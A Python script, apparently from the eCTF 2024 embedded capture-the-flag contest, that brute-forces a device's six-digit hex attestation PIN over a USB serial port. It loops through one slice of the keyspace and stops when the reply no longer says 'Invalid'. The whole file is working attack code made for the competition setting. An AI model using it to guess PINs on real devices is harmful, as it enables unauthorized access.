#ECTF2024 brute force script

import serial
import time
import itertools



# Filter out combinations that contain only numbers
# filtered_hex_strings = [s for s in all_hex_strings if not s.isdigit()]


all_hex_strings = [''.join(p) for p in itertools.product('0123456789abcdef', repeat=6)]

# Convert each string to the required byte format with carriage return
byte_strings = [bytes(s + '\r', 'utf-8') for s in all_hex_strings]
# byte_strings = [bytes(str(i).zfill(6)+'\r', 'utf-8') for i in range(0,100)]

def brute_force():
    serialPort = serial.Serial(port="/dev/tty.usbmodem102", baudrate=115200)
    serialPort.write(b"attest\r")
    print('-',serialPort.readline())
    print('-',serialPort.readline())
    serialPort.write(byte_strings[0])
    print('-',serialPort.readline())
    print('-',serialPort.readline())
    # 88000,5592405
    for i in range(5592405, 11184810):  # 5592405, 11184810    11184810, 16777216    split the ranges into three to run parallel
        # 41000
        # print(byte_strings[i])
        # print(i)
        line1 = serialPort.readline()
        # print(1, line1)
        serialPort.write(b"attest\r")
        line2 = serialPort.readline()
        # print(2, line2)
        line3 = serialPort.readline()
        # print(3, line3)
        serialPort.write(byte_strings[i])
        line4 = serialPort.readline()
        # print(4, line4)
        test= serialPort.readline()
        # print(test.decode()[1:13])

        if i%1000 == 0: 
            print(i, byte_strings[i], test[1:13].decode())

        if test[8:15].decode() != 'Invalid':
            print("true")
            print(byte_strings[i])
            print(test)
            print(serialPort.readline())
            print(serialPort.readline())
            print(serialPort.readline())
            break
        
        
print("Start")
brute_force()
print("End")